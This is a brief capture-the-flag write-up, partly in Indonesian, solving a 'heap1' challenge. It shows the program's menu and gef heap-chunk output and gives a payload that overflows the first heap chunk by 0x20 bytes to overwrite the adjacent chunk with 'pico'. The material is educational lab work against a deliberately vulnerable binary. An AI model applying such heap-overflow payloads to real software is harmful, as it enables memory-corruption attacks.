# Heap 1
## Problem
```
Welcome to heap1!
I put my data on the heap so it should be safe from any tampering.
Since my data isn't on the stack I'll even let you write whatever info you want to the heap, I already took care of using malloc for you.

Heap State:
+-------------+----------------+
[*] Address   ->   Heap Data   
+-------------+----------------+
[*]   0x55a8f7dac420  ->   pico
+-------------+----------------+
[*]   0x55a8f7dac440  ->   bico
+-------------+----------------+

1. Print Heap:		(print the current state of the heap)
2. Write to buffer:	(write to your own personal block of data on the heap)
3. Print safe_var:	(I'll even let you look at my variable on the heap, I'm confident it can't be modified)
4. Print Flag:		(Try to print the flag, good luck)
5. Exit

Enter your choice: 
```
Harus mengubah chunk ke2 bernilai pico

## Solusi
Mirip dengan input injection 2, kita overflow chunk ke2 dari chunk ke1 dengan offset sebesar size dari chunk1
```
gef➤  heap chunks
Chunk(addr=0x555555559010, size=0x410, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559010     45 6e 74 65 72 20 79 6f 75 72 20 63 68 6f 69 63    Enter your choic]
Chunk(addr=0x555555559420, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559420     70 69 63 6f 00 00 00 00 00 00 00 00 00 00 00 00    pico............]
Chunk(addr=0x555555559440, size=0x20, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559440     62 69 63 6f 00 00 00 00 00 00 00 00 00 00 00 00    bico............]
Chunk(addr=0x555555559460, size=0x20bb0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
    [0x0000555555559460     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]

```

Offsetnya sebesar 0x20, sehingga payloadnya
Aa0Bb1Cc2Dd3Ee4Ff5Gg6Hh7Ii8Jj9Kkpico